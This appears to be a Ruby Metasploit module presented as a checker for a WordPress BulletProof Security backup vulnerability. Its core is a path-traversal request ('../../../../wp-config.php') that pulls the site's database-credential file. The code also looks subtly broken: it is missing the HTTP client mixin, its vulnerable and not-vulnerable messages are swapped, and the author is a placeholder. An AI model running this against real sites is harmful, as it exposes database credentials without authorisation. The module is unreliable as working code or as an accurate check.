##
# This module tests if a WordPress site is vulnerable to the wp_bulletproofsecurity_backups vulnerability.
#
# Reference:
# https://wpvulndb.com/vulnerabilities/9376
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'wp_bulletproofsecurity_backups Vulnerability Checker',
      'Description'    => 'Checks if a WordPress site is vulnerable to the wp_bulletproofsecurity_backups vulnerability.',
      'Author'         => ['Author Name'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://wpvulndb.com/vulnerabilities/9376']
      ]
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the WordPress application', '/'])
    ])
  end

  def run
    begin
      print_status("Connecting to the WordPress site...")
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'bulletproof-security', 'backup', 'download.php'),
        'method' => 'GET',
        'vars_get' => {
          'file' => '../../../../wp-config.php'
        }
      })

      if res and res.code == 200 and res.body.include?('DB_NAME')
        print_error("The WordPress site is vulnerable to the wp_bulletproofsecurity_backups vulnerability.")
      else
        print_good("The WordPress site is not vulnerable to the wp_bulletproofsecurity_backups vulnerability.")
      end

    rescue ::Rex::ConnectionError
      print_error("Could not connect to the WordPress site.")
    end
  end

end
